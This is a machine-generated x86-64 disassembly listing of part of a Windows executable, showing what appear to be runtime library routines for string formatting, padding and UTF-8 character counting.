   140003526:	84 c0                	test   %al,%al
   140003528:	0f 85 b9 00 00 00    	jne    0x1400035e7
   14000352e:	48 8b 45 00          	mov    0x0(%rbp),%rax
   140003532:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
   140003536:	48 89 48 10          	mov    %rcx,0x10(%rax)
   14000353a:	31 db                	xor    %ebx,%ebx
   14000353c:	e9 a6 00 00 00       	jmp    0x1400035e7
   140003541:	31 c0                	xor    %eax,%eax
   140003543:	eb 06                	jmp    0x14000354b
   140003545:	41 0f b7 c2          	movzwl %r10w,%eax
   140003549:	d1 e8                	shr    $1,%eax
   14000354b:	81 e7 ff ff 1f 00    	and    $0x1fffff,%edi
   140003551:	4c 8b 29             	mov    (%rcx),%r13
   140003554:	4c 8b 61 08          	mov    0x8(%rcx),%r12
   140003558:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   14000355c:	8d 70 01             	lea    0x1(%rax),%esi
   14000355f:	90                   	nop
   140003560:	66 ff ce             	dec    %si
   140003563:	74 12                	je     0x140003577
   140003565:	4c 89 e9             	mov    %r13,%rcx
   140003568:	89 fa                	mov    %edi,%edx
   14000356a:	41 ff 54 24 20       	call   *0x20(%r12)
   14000356f:	84 c0                	test   %al,%al
   140003571:	74 ed                	je     0x140003560
   140003573:	b3 01                	mov    $0x1,%bl
   140003575:	eb 70                	jmp    0x1400035e7
   140003577:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   14000357c:	4c 89 e9             	mov    %r13,%rcx
   14000357f:	4c 89 e2             	mov    %r12,%rdx
   140003582:	44 8b 45 f4          	mov    -0xc(%rbp),%r8d
   140003586:	49 89 d9             	mov    %rbx,%r9
   140003589:	e8 82 02 00 00       	call   0x140003810
   14000358e:	b3 01                	mov    $0x1,%bl
   140003590:	84 c0                	test   %al,%al
   140003592:	75 53                	jne    0x1400035e7
   140003594:	4c 89 e9             	mov    %r13,%rcx
   140003597:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
   14000359b:	4c 8b 45 d8          	mov    -0x28(%rbp),%r8
   14000359f:	41 ff 54 24 18       	call   *0x18(%r12)
   1400035a4:	84 c0                	test   %al,%al
   1400035a6:	75 3f                	jne    0x1400035e7
   1400035a8:	48 8b 5d f8          	mov    -0x8(%rbp),%rbx
   1400035ac:	29 5d 00             	sub    %ebx,0x0(%rbp)
   1400035af:	03 5d e0             	add    -0x20(%rbp),%ebx
   1400035b2:	44 29 fb             	sub    %r15d,%ebx
   1400035b5:	66 be ff ff          	mov    $0xffff,%si
   1400035b9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400035c0:	8d 04 33             	lea    (%rbx,%rsi,1),%eax
   1400035c3:	66 83 f8 ff          	cmp    $0xffff,%ax
   1400035c7:	74 12                	je     0x1400035db
   1400035c9:	4c 89 e9             	mov    %r13,%rcx
   1400035cc:	89 fa                	mov    %edi,%edx
   1400035ce:	41 ff 54 24 20       	call   *0x20(%r12)
   1400035d3:	ff c6                	inc    %esi
   1400035d5:	84 c0                	test   %al,%al
   1400035d7:	74 e7                	je     0x1400035c0
   1400035d9:	eb 05                	jmp    0x1400035e0
   1400035db:	8b 45 00             	mov    0x0(%rbp),%eax
   1400035de:	89 c6                	mov    %eax,%esi
   1400035e0:	66 3b 75 00          	cmp    0x0(%rbp),%si
   1400035e4:	0f 92 c3             	setb   %bl
   1400035e7:	89 d8                	mov    %ebx,%eax
   1400035e9:	48 83 c4 58          	add    $0x58,%rsp
   1400035ed:	5b                   	pop    %rbx
   1400035ee:	5f                   	pop    %rdi
   1400035ef:	5e                   	pop    %rsi
   1400035f0:	41 5c                	pop    %r12
   1400035f2:	41 5d                	pop    %r13
   1400035f4:	41 5e                	pop    %r14
   1400035f6:	41 5f                	pop    %r15
   1400035f8:	5d                   	pop    %rbp
   1400035f9:	c3                   	ret
   1400035fa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140003600:	41 57                	push   %r15
   140003602:	41 56                	push   %r14
   140003604:	41 55                	push   %r13
   140003606:	41 54                	push   %r12
   140003608:	56                   	push   %rsi
   140003609:	57                   	push   %rdi
   14000360a:	53                   	push   %rbx
   14000360b:	4c 8d 41 07          	lea    0x7(%rcx),%r8
   14000360f:	49 83 e0 f8          	and    $0xfffffffffffffff8,%r8
   140003613:	4c 89 c0             	mov    %r8,%rax
   140003616:	48 29 c8             	sub    %rcx,%rax
   140003619:	48 29 c2             	sub    %rax,%rdx
   14000361c:	41 89 d1             	mov    %edx,%r9d
   14000361f:	41 83 e1 07          	and    $0x7,%r9d
   140003623:	4c 89 c0             	mov    %r8,%rax
   140003626:	45 31 d2             	xor    %r10d,%r10d
   140003629:	48 29 c8             	sub    %rcx,%rax
   14000362c:	74 28                	je     0x140003656
   14000362e:	45 31 db             	xor    %r11d,%r11d
   140003631:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140003638:	0f 1f 84 00 00 00 00 
   14000363f:	00 
   140003640:	31 f6                	xor    %esi,%esi
   140003642:	42 80 3c 19 c0       	cmpb   $0xc0,(%rcx,%r11,1)
   140003647:	40 0f 9d c6          	setge  %sil
   14000364b:	49 01 f2             	add    %rsi,%r10
   14000364e:	49 ff c3             	inc    %r11
   140003651:	4c 39 d8             	cmp    %r11,%rax
   140003654:	75 ea                	jne    0x140003640
   140003656:	4d 85 c9             	test   %r9,%r9
   140003659:	74 2d                	je     0x140003688
   14000365b:	48 89 d1             	mov    %rdx,%rcx
   14000365e:	48 83 e1 f8          	and    $0xfffffffffffffff8,%rcx
   140003662:	4c 01 c1             	add    %r8,%rcx
   140003665:	31 c0                	xor    %eax,%eax
   140003667:	45 31 db             	xor    %r11d,%r11d
   14000366a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140003670:	31 f6                	xor    %esi,%esi
   140003672:	42 80 3c 19 c0       	cmpb   $0xc0,(%rcx,%r11,1)
   140003677:	40 0f 9d c6          	setge  %sil
   14000367b:	48 01 f0             	add    %rsi,%rax
   14000367e:	49 ff c3             	inc    %r11
   140003681:	4d 39 d9             	cmp    %r11,%r9
   140003684:	75 ea                	jne    0x140003670
   140003686:	eb 02                	jmp    0x14000368a
   140003688:	31 c0                	xor    %eax,%eax
   14000368a:	4c 01 d0             	add    %r10,%rax
   14000368d:	48 c1 ea 03          	shr    $0x3,%rdx
   140003691:	49 ba 01 01 01 01 01 	movabs $0x101010101010101,%r10
   140003698:	01 01 01 
   14000369b:	49 b9 ff 00 ff 00 ff 	movabs $0xff00ff00ff00ff,%r9
   1400036a2:	00 ff 00 
   1400036a5:	48 b9 01 00 01 00 01 	movabs $0x1000100010001,%rcx
   1400036ac:	00 01 00 
   1400036af:	eb 40                	jmp    0x1400036f1
   1400036b1:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   1400036b8:	0f 1f 84 00 00 00 00 
   1400036bf:	00 
   1400036c0:	31 db                	xor    %ebx,%ebx
   1400036c2:	4d 01 d8             	add    %r11,%r8
   1400036c5:	48 29 f2             	sub    %rsi,%rdx
   1400036c8:	89 f7                	mov    %esi,%edi
   1400036ca:	83 e7 03             	and    $0x3,%edi
   1400036cd:	49 89 de             	mov    %rbx,%r14
   1400036d0:	4d 21 ce             	and    %r9,%r14
   1400036d3:	48 c1 eb 08          	shr    $0x8,%rbx
   1400036d7:	4c 21 cb             	and    %r9,%rbx
   1400036da:	4c 01 f3             	add    %r14,%rbx
   1400036dd:	48 0f af d9          	imul   %rcx,%rbx
   1400036e1:	48 c1 eb 30          	shr    $0x30,%rbx
   1400036e5:	48 01 d8             	add    %rbx,%rax
   1400036e8:	48 85 ff             	test   %rdi,%rdi
   1400036eb:	0f 85 b8 00 00 00    	jne    0x1400037a9
   1400036f1:	48 85 d2             	test   %rdx,%rdx
   1400036f4:	0f 84 05 01 00 00    	je     0x1400037ff
   1400036fa:	4d 89 c3             	mov    %r8,%r11
   1400036fd:	48 81 fa c0 00 00 00 	cmp    $0xc0,%rdx
   140003704:	be c0 00 00 00       	mov    $0xc0,%esi
   140003709:	48 0f 42 f2          	cmovb  %rdx,%rsi
   14000370d:	44 8d 04 f5 00 00 00 	lea    0x0(,%rsi,8),%r8d
   140003714:	00 
   140003715:	48 83 fa 04          	cmp    $0x4,%rdx
   140003719:	72 a5                	jb     0x1400036c0
   14000371b:	44 89 c7             	mov    %r8d,%edi
   14000371e:	81 e7 e0 07 00 00    	and    $0x7e0,%edi
   140003724:	4c 01 df             	add    %r11,%rdi
   140003727:	31 db                	xor    %ebx,%ebx
   140003729:	4d 89 de             	mov    %r11,%r14
   14000372c:	0f 1f 40 00          	nopl   0x0(%rax)
   140003730:	4d 8b 3e             	mov    (%r14),%r15
   140003733:	4d 8b 66 08          	mov    0x8(%r14),%r12
   140003737:	4d 89 fd             	mov    %r15,%r13
   14000373a:	49 f7 d5             	not    %r13
   14000373d:	49 c1 ed 07          	shr    $0x7,%r13
   140003741:	49 c1 ef 06          	shr    $0x6,%r15
   140003745:	4d 09 ef             	or     %r13,%r15
   140003748:	4d 21 d7             	and    %r10,%r15
   14000374b:	49 01 df             	add    %rbx,%r15
   14000374e:	4c 89 e3             	mov    %r12,%rbx
   140003751:	48 f7 d3             	not    %rbx
   140003754:	48 c1 eb 07          	shr    $0x7,%rbx
   140003758:	49 c1 ec 06          	shr    $0x6,%r12
   14000375c:	49 09 dc             	or     %rbx,%r12
   14000375f:	4d 21 d4             	and    %r10,%r12
   140003762:	4d 8b 6e 10          	mov    0x10(%r14),%r13
   140003766:	4c 89 eb             	mov    %r13,%rbx
   140003769:	48 f7 d3             	not    %rbx
   14000376c:	48 c1 eb 07          	shr    $0x7,%rbx
   140003770:	49 c1 ed 06          	shr    $0x6,%r13
   140003774:	49 09 dd             	or     %rbx,%r13
   140003777:	4d 21 d5             	and    %r10,%r13
   14000377a:	4d 01 e5             	add    %r12,%r13
   14000377d:	4d 01 fd             	add    %r15,%r13
   140003780:	49 8b 5e 18          	mov    0x18(%r14),%rbx
   140003784:	49 89 df             	mov    %rbx,%r15
   140003787:	49 f7 d7             	not    %r15
   14000378a:	49 c1 ef 07          	shr    $0x7,%r15
   14000378e:	48 c1 eb 06          	shr    $0x6,%rbx
   140003792:	4c 09 fb             	or     %r15,%rbx
   140003795:	4c 21 d3             	and    %r10,%rbx
   140003798:	4c 01 eb             	add    %r13,%rbx
   14000379b:	49 83 c6 20          	add    $0x20,%r14
   14000379f:	49 39 fe             	cmp    %rdi,%r14
   1400037a2:	75 8c                	jne    0x140003730
   1400037a4:	e9 19 ff ff ff       	jmp    0x1400036c2
   1400037a9:	81 e6 fc 00 00 00    	and    $0xfc,%esi
   1400037af:	4d 8d 04 f3          	lea    (%r11,%rsi,8),%r8
   1400037b3:	c1 e7 03             	shl    $0x3,%edi
   1400037b6:	45 31 db             	xor    %r11d,%r11d
   1400037b9:	31 d2                	xor    %edx,%edx
   1400037bb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400037c0:	4b 8b 34 18          	mov    (%r8,%r11,1),%rsi
   1400037c4:	48 89 f3             	mov    %rsi,%rbx
   1400037c7:	48 f7 d3             	not    %rbx
   1400037ca:	48 c1 eb 07          	shr    $0x7,%rbx
   1400037ce:	48 c1 ee 06          	shr    $0x6,%rsi
   1400037d2:	48 09 de             	or     %rbx,%rsi
   1400037d5:	4c 21 d6             	and    %r10,%rsi
   1400037d8:	48 01 f2             	add    %rsi,%rdx
   1400037db:	49 83 c3 08          	add    $0x8,%r11
   1400037df:	4c 39 df             	cmp    %r11,%rdi
   1400037e2:	75 dc                	jne    0x1400037c0
   1400037e4:	49 89 d0             	mov    %rdx,%r8
   1400037e7:	4d 21 c8             	and    %r9,%r8
   1400037ea:	48 c1 ea 08          	shr    $0x8,%rdx
   1400037ee:	4c 21 ca             	and    %r9,%rdx
   1400037f1:	4c 01 c2             	add    %r8,%rdx
   1400037f4:	48 0f af d1          	imul   %rcx,%rdx
   1400037f8:	48 c1 ea 30          	shr    $0x30,%rdx
   1400037fc:	48 01 d0             	add    %rdx,%rax
   1400037ff:	5b                   	pop    %rbx
   140003800:	5f                   	pop    %rdi
   140003801:	5e                   	pop    %rsi
   140003802:	41 5c                	pop    %r12
   140003804:	41 5d                	pop    %r13
   140003806:	41 5e                	pop    %r14
   140003808:	41 5f                	pop    %r15
   14000380a:	c3                   	ret
   14000380b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003810:	55                   	push   %rbp
   140003811:	41 56                	push   %r14
   140003813:	56                   	push   %rsi
   140003814:	57                   	push   %rdi
   140003815:	53                   	push   %rbx
   140003816:	48 83 ec 20          	sub    $0x20,%rsp
   14000381a:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   14000381f:	4c 89 ce             	mov    %r9,%rsi
   140003822:	48 89 d3             	mov    %rdx,%rbx
   140003825:	48 8b 7d 50          	mov    0x50(%rbp),%rdi
   140003829:	41 81 f8 00 00 11 00 	cmp    $0x110000,%r8d
   140003830:	74 14                	je     0x140003846
   140003832:	49 89 ce             	mov    %rcx,%r14
   140003835:	44 89 c2             	mov    %r8d,%edx
   140003838:	ff 53 20             	call   *0x20(%rbx)
   14000383b:	4c 89 f1             	mov    %r14,%rcx
   14000383e:	89 c2                	mov    %eax,%edx
   140003840:	b0 01                	mov    $0x1,%al
   140003842:	84 d2                	test   %dl,%dl
   140003844:	75 1e                	jne    0x140003864
   140003846:	48 85 f6             	test   %rsi,%rsi
   140003849:	74 17                	je     0x140003862
   14000384b:	48 8b 43 18          	mov    0x18(%rbx),%rax
   14000384f:	48 89 f2             	mov    %rsi,%rdx
   140003852:	49 89 f8             	mov    %rdi,%r8
   140003855:	48 83 c4 20          	add    $0x20,%rsp
   140003859:	5b                   	pop    %rbx
   14000385a:	5f                   	pop    %rdi
   14000385b:	5e                   	pop    %rsi
   14000385c:	41 5e                	pop    %r14
   14000385e:	5d                   	pop    %rbp
   14000385f:	48 ff e0             	rex.W jmp *%rax
   140003862:	31 c0                	xor    %eax,%eax
   140003864:	48 83 c4 20          	add    $0x20,%rsp
   140003868:	5b                   	pop    %rbx
   140003869:	5f                   	pop    %rdi
   14000386a:	5e                   	pop    %rsi
   14000386b:	41 5e                	pop    %r14
   14000386d:	5d                   	pop    %rbp
   14000386e:	c3                   	ret
   14000386f:	90                   	nop
   140003870:	55                   	push   %rbp
   140003871:	48 83 ec 20          	sub    $0x20,%rsp
   140003875:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   14000387a:	e8 01 00 00 00       	call   0x140003880
   14000387f:	cc                   	int3
   140003880:	55                   	push   %rbp
   140003881:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   140003888:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
   14000388f:	00 
   140003890:	48 89 4d f8          	mov    %rcx,-0x8(%rbp)
   140003894:	48 89 55 f0          	mov    %rdx,-0x10(%rbp)
   140003898:	48 8d 45 f8          	lea    -0x8(%rbp),%rax
   14000389c:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
   1400038a0:	48 8d 05 89 f9 ff ff 	lea    -0x677(%rip),%rax        # 0x140003230
   1400038a7:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
   1400038ab:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1400038af:	48 89 4d e0          	mov    %rcx,-0x20(%rbp)
   1400038b3:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   1400038b7:	48 8d 05 2a 37 86 00 	lea    0x86372a(%rip),%rax        # 0x140866fe8
   1400038be:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
   1400038c2:	48 c7 45 a8 02 00 00 	movq   $0x2,-0x58(%rbp)
   1400038c9:	00 
   1400038ca:	48 c7 45 c0 00 00 00 	movq   $0x0,-0x40(%rbp)
   1400038d1:	00 
   1400038d2:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
   1400038d6:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
   1400038da:	48 c7 45 b8 02 00 00 	movq   $0x2,-0x48(%rbp)
   1400038e1:	00 
   1400038e2:	48 8d 4d a0          	lea    -0x60(%rbp),%rcx
   1400038e6:	4c 89 c2             	mov    %r8,%rdx
   1400038e9:	e8 62 fa ff ff       	call   0x140003350
   1400038ee:	cc                   	int3
   1400038ef:	90                   	nop
   1400038f0:	55                   	push   %rbp
   1400038f1:	48 83 ec 20          	sub    $0x20,%rsp
   1400038f5:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   1400038fa:	e8 01 00 00 00       	call   0x140003900
   1400038ff:	cc                   	int3
   140003900:	55                   	push   %rbp
   140003901:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   140003908:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
   14000390f:	00 
   140003910:	48 89 4d f8          	mov    %rcx,-0x8(%rbp)
   140003914:	48 89 55 f0          	mov    %rdx,-0x10(%rbp)
   140003918:	48 8d 45 f8          	lea    -0x8(%rbp),%rax
   14000391c:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
   140003920:	48 8d 05 09 f9 ff ff 	lea    -0x6f7(%rip),%rax        # 0x140003230
   140003927:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
   14000392b:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   14000392f:	48 89 4d e0          	mov    %rcx,-0x20(%rbp)
   140003933:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140003937:	48 8d 05 da 36 86 00 	lea    0x8636da(%rip),%rax        # 0x140867018
   14000393e:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
   140003942:	48 c7 45 a8 02 00 00 	movq   $0x2,-0x58(%rbp)
   140003949:	00 
   14000394a:	48 c7 45 c0 00 00 00 	movq   $0x0,-0x40(%rbp)
   140003951:	00 
   140003952:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
   140003956:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
   14000395a:	48 c7 45 b8 02 00 00 	movq   $0x2,-0x48(%rbp)
   140003961:	00 
   140003962:	48 8d 4d a0          	lea    -0x60(%rbp),%rcx
   140003966:	4c 89 c2             	mov    %r8,%rdx
   140003969:	e8 e2 f9 ff ff       	call   0x140003350
   14000396e:	cc                   	int3
   14000396f:	90                   	nop
   140003970:	55                   	push   %rbp
   140003971:	41 57                	push   %r15
   140003973:	41 56                	push   %r14
   140003975:	41 55                	push   %r13
   140003977:	41 54                	push   %r12
   140003979:	56                   	push   %rsi
   14000397a:	57                   	push   %rdi
   14000397b:	53                   	push   %rbx
   14000397c:	48 83 ec 38          	sub    $0x38,%rsp
   140003980:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   140003985:	4c 89 c3             	mov    %r8,%rbx
   140003988:	48 89 d7             	mov    %rdx,%rdi
   14000398b:	8b 71 10             	mov    0x10(%rcx),%esi
   14000398e:	f7 c6 00 00 00 18    	test   $0x18000000,%esi
   140003994:	0f 84 03 01 00 00    	je     0x140003a9d
   14000399a:	f7 c6 00 00 00 10    	test   $0x10000000,%esi
   1400039a0:	75 37                	jne    0x1400039d9
   1400039a2:	48 83 fb 20          	cmp    $0x20,%rbx
   1400039a6:	0f 83 98 00 00 00    	jae    0x140003a44
   1400039ac:	48 85 db             	test   %rbx,%rbx
   1400039af:	0f 84 97 01 00 00    	je     0x140003b4c
   1400039b5:	45 31 f6             	xor    %r14d,%r14d
   1400039b8:	31 c0                	xor    %eax,%eax
   1400039ba:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400039c0:	31 d2                	xor    %edx,%edx
   1400039c2:	80 3c 07 c0          	cmpb   $0xc0,(%rdi,%rax,1)
   1400039c6:	0f 9d c2             	setge  %dl
   1400039c9:	49 01 d6             	add    %rdx,%r14
   1400039cc:	48 ff c0             	inc    %rax
   1400039cf:	48 39 c3             	cmp    %rax,%rbx
   1400039d2:	75 ec                	jne    0x1400039c0
   1400039d4:	e9 91 00 00 00       	jmp    0x140003a6a
   1400039d9:	44 0f b7 71 16       	movzwl 0x16(%rcx),%r14d
   1400039de:	4d 85 f6             	test   %r14,%r14
   1400039e1:	74 77                	je     0x140003a5a
   1400039e3:	48 01 fb             	add    %rdi,%rbx
   1400039e6:	45 31 c0             	xor    %r8d,%r8d
   1400039e9:	48 89 fa             	mov    %rdi,%rdx
   1400039ec:	4c 89 f0             	mov    %r14,%rax
   1400039ef:	eb 24                	jmp    0x140003a15
   1400039f1:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   1400039f8:	0f 1f 84 00 00 00 00 
   1400039ff:	00 
   140003a00:	4c 8d 52 01          	lea    0x1(%rdx),%r10
   140003a04:	4d 89 d0             	mov    %r10,%r8
   140003a07:	49 29 d0             	sub    %rdx,%r8
   140003a0a:	4d 01 c8             	add    %r9,%r8
   140003a0d:	4c 89 d2             	mov    %r10,%rdx
   140003a10:	48 ff c8             	dec    %rax
   140003a13:	74 48                	je     0x140003a5d
   140003a15:	4d 89 c1             	mov    %r8,%r9
   140003a18:	48 39 da             	cmp    %rbx,%rdx
   140003a1b:	74 44                	je     0x140003a61
   140003a1d:	44 0f b6 02          	movzbl (%rdx),%r8d
   140003a21:	45 84 c0             	test   %r8b,%r8b
   140003a24:	79 da                	jns    0x140003a00
   140003a26:	41 80 f8 e0          	cmp    $0xe0,%r8b
   140003a2a:	72 0c                	jb     0x140003a38
   140003a2c:	41 80 f8 f0          	cmp    $0xf0,%r8b
   140003a30:	72 0c                	jb     0x140003a3e
   140003a32:	4c 8d 52 04          	lea    0x4(%rdx),%r10
   140003a36:	eb cc                	jmp    0x140003a04
   140003a38:	4c 8d 52 02          	lea    0x2(%rdx),%r10
   140003a3c:	eb c6                	jmp    0x140003a04
   140003a3e:	4c 8d 52 03          	lea    0x3(%rdx),%r10
   140003a42:	eb c0                	jmp    0x140003a04
   140003a44:	49 89 ce             	mov    %rcx,%r14
   140003a47:	48 89 f9             	mov    %rdi,%rcx
   140003a4a:	48 89 da             	mov    %rbx,%rdx
   140003a4d:	e8 ae fb ff ff       	call   0x140003600
   140003a52:	4c 89 f1             	mov    %r14,%rcx
   140003a55:	49 89 c6             	mov    %rax,%r14
   140003a58:	eb 10                	jmp    0x140003a6a
   140003a5a:	45 31 c0             	xor    %r8d,%r8d
   140003a5d:	31 c0                	xor    %eax,%eax
   140003a5f:	eb 03                	jmp    0x140003a64
   140003a61:	4d 89 c8             	mov    %r9,%r8
   140003a64:	49 29 c6             	sub    %rax,%r14
   140003a67:	4c 89 c3             	mov    %r8,%rbx
   140003a6a:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   140003a6e:	49 39 c6             	cmp    %rax,%r14
   140003a71:	73 2a                	jae    0x140003a9d
   140003a73:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140003a77:	41 89 c0             	mov    %eax,%r8d
   140003a7a:	45 29 f0             	sub    %r14d,%r8d
   140003a7d:	89 f0                	mov    %esi,%eax
   140003a7f:	c1 e8 1d             	shr    $0x1d,%eax
   140003a82:	83 e0 03             	and    $0x3,%eax
   140003a85:	48 8d 15 94 15 04 00 	lea    0x41594(%rip),%rdx        # 0x140045020
   140003a8c:	48 63 04 82          	movslq (%rdx,%rax,4),%rax
   140003a90:	48 01 d0             	add    %rdx,%rax
   140003a93:	44 89 45 04          	mov    %r8d,0x4(%rbp)
   140003a97:	ff e0                	jmp    *%rax
   140003a99:	31 c0                	xor    %eax,%eax
   140003a9b:	eb 32                	jmp    0x140003acf
   140003a9d:	48 8b 01             	mov    (%rcx),%rax
   140003aa0:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140003aa4:	4c 8b 49 18          	mov    0x18(%rcx),%r9
   140003aa8:	48 89 c1             	mov    %rax,%rcx
   140003aab:	48 89 fa             	mov    %rdi,%rdx
   140003aae:	49 89 d8             	mov    %rbx,%r8
   140003ab1:	48 83 c4 38          	add    $0x38,%rsp
   140003ab5:	5b                   	pop    %rbx
   140003ab6:	5f                   	pop    %rdi
   140003ab7:	5e                   	pop    %rsi
   140003ab8:	41 5c                	pop    %r12
   140003aba:	41 5d                	pop    %r13
   140003abc:	41 5e                	pop    %r14
   140003abe:	41 5f                	pop    %r15
   140003ac0:	5d                   	pop    %rbp
   140003ac1:	49 ff e1             	rex.WB jmp *%r9
   140003ac4:	44 89 c0             	mov    %r8d,%eax
   140003ac7:	eb 06                	jmp    0x140003acf
   140003ac9:	41 0f b7 c0          	movzwl %r8w,%eax
   140003acd:	d1 e8                	shr    $1,%eax
   140003acf:	81 e6 ff ff 1f 00    	and    $0x1fffff,%esi
   140003ad5:	4c 8b 39             	mov    (%rcx),%r15
   140003ad8:	4c 8b 61 08          	mov    0x8(%rcx),%r12
   140003adc:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140003ae0:	44 8d 68 01          	lea    0x1(%rax),%r13d
   140003ae4:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
   140003aeb:	00 00 00 00 00 
   140003af0:	4c 89 f9             	mov    %r15,%rcx
   140003af3:	66 41 ff cd          	dec    %r13w
   140003af7:	74 0f                	je     0x140003b08
   140003af9:	89 f2                	mov    %esi,%edx
   140003afb:	41 ff 54 24 20       	call   *0x20(%r12)
   140003b00:	84 c0                	test   %al,%al
   140003b02:	74 ec                	je     0x140003af0
   140003b04:	b0 01                	mov    $0x1,%al
   140003b06:	eb 56                	jmp    0x140003b5e
   140003b08:	48 89 fa             	mov    %rdi,%rdx
   140003b0b:	49 89 d8             	mov    %rbx,%r8
   140003b0e:	41 ff 54 24 18       	call   *0x18(%r12)
   140003b13:	89 c1                	mov    %eax,%ecx
   140003b15:	b0 01                	mov    $0x1,%al
   140003b17:	84 c9                	test   %cl,%cl
   140003b19:	75 43                	jne    0x140003b5e
   140003b1b:	8b 5d 04             	mov    0x4(%rbp),%ebx
   140003b1e:	4c 8b 6d f0          	mov    -0x10(%rbp),%r13
   140003b22:	44 29 eb             	sub    %r13d,%ebx
   140003b25:	45 01 f5             	add    %r14d,%r13d
   140003b28:	44 2b 6d f8          	sub    -0x8(%rbp),%r13d
   140003b2c:	66 bf ff ff          	mov    $0xffff,%di
   140003b30:	42 8d 04 2f          	lea    (%rdi,%r13,1),%eax
   140003b34:	66 83 f8 ff          	cmp    $0xffff,%ax
   140003b38:	74 1c                	je     0x140003b56
   140003b3a:	4c 89 f9             	mov    %r15,%rcx
   140003b3d:	89 f2                	mov    %esi,%edx
   140003b3f:	41 ff 54 24 20       	call   *0x20(%r12)
   140003b44:	ff c7                	inc    %edi
   140003b46:	84 c0                	test   %al,%al
   140003b48:	74 e6                	je     0x140003b30
   140003b4a:	eb 0c                	jmp    0x140003b58
   140003b4c:	31 db                	xor    %ebx,%ebx
   140003b4e:	45 31 f6             	xor    %r14d,%r14d
   140003b51:	e9 14 ff ff ff       	jmp    0x140003a6a
   140003b56:	89 df                	mov    %ebx,%edi
   140003b58:	66 39 df             	cmp    %bx,%di
   140003b5b:	0f 92 c0             	setb   %al
   140003b5e:	48 83 c4 38          	add    $0x38,%rsp
   140003b62:	5b                   	pop    %rbx
   140003b63:	5f                   	pop    %rdi
   140003b64:	5e                   	pop    %rsi
   140003b65:	41 5c                	pop    %r12
   140003b67:	41 5d                	pop    %r13
   140003b69:	41 5e                	pop    %r14
   140003b6b:	41 5f                	pop    %r15
   140003b6d:	5d                   	pop    %rbp
   140003b6e:	c3                   	ret
   140003b6f:	90                   	nop
   140003b70:	55                   	push   %rbp
   140003b71:	48 83 ec 60          	sub    $0x60,%rsp
   140003b75:	48 8d 6c 24 60       	lea    0x60(%rsp),%rbp
   140003b7a:	48 89 4d f0          	mov    %rcx,-0x10(%rbp)
   140003b7e:	48 89 55 f8          	mov    %rdx,-0x8(%rbp)
   140003b82:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   140003b86:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
   140003b8a:	48 c7 45 c8 01 00 00 	movq   $0x1,-0x38(%rbp)
   140003b91:	00 
   140003b92:	48 c7 45 d0 08 00 00 	movq   $0x8,-0x30(%rbp)
   140003b99:	00 
   140003b9a:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003b9d:	0f 11 45 d8          	movups %xmm0,-0x28(%rbp)
   140003ba1:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   140003ba5:	4c 89 c2             	mov    %r8,%rdx
   140003ba8:	e8 a3 f7 ff ff       	call   0x140003350
   140003bad:	cc                   	int3
   140003bae:	55                   	push   %rbp
   140003baf:	48 81 ec f0 00 00 00 	sub    $0xf0,%rsp
   140003bb6:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
   140003bbd:	00 
   140003bbe:	48 89 d0             	mov    %rdx,%rax
   140003bc1:	48 8b 95 a8 00 00 00 	mov    0xa8(%rbp),%rdx
   140003bc8:	4c 8b 95 a0 00 00 00 	mov    0xa0(%rbp),%r10
   140003bcf:	48 89 4d 60          	mov    %rcx,0x60(%rbp)
   140003bd3:	48 89 45 68          	mov    %rax,0x68(%rbp)
   140003bd7:	4c 89 45 50          	mov    %r8,0x50(%rbp)
   140003bdb:	4c 89 4d 58          	mov    %r9,0x58(%rbp)
   140003bdf:	48 8d 05 22 28 86 00 	lea    0x862822(%rip),%rax        # 0x140866408
   140003be6:	48 89 45 40          	mov    %rax,0x40(%rbp)
   140003bea:	48 c7 45 48 02 00 00 	movq   $0x2,0x48(%rbp)
   140003bf1:	00 
   140003bf2:	49 83 3a 00          	cmpq   $0x0,(%r10)
   140003bf6:	75 54                	jne    0x140003c4c
